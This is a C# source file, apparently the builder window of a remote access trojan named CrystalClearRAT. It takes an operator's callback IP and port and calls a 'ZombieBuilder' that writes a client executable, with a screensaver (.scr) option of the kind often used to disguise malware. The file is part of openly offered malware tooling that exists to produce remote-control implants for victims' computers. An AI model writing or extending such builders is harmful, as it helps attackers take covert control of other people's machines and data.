using CrystalClearRAT.Helper;
using CrystalRATShared.Helper;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace CrystalClearRAT.Windows
{
    /// <summary>
    /// Logika interakcji dla klasy BuilderWindow.xaml
    /// </summary>
    public partial class BuilderWindow : Window
    {
        public BuilderWindow()
        {
            InitializeComponent();
        }



        private void Button_Click(object sender, RoutedEventArgs e)
        {
            string errorMsg = "";

            if (string.IsNullOrWhiteSpace(ipTextBox.Text))
            {
                errorMsg = "IP cannot be empty.";
            }
            else if (string.IsNullOrWhiteSpace(portTextBox.Text))
            {
                errorMsg = "Port cannot be empty";
            }

            if (errorMsg.Length > 0)
            {
                MessageBox.Show("Error", errorMsg, MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            SaveFileDialog dialog = new SaveFileDialog()
            {
                Filter = "Executable (.exe)|*.exe|Screensaver (.scr)|*.scr"
            };
           // dialog.Filter = "Exe Files (.exe)|*.exe;
            if (dialog.ShowDialog() == true)
            {
                ZombieBuilder.Build(new ClientSettings(ipTextBox.Text, int.Parse(portTextBox.Text)), dialog.FileName);
            }
        }
    }
}
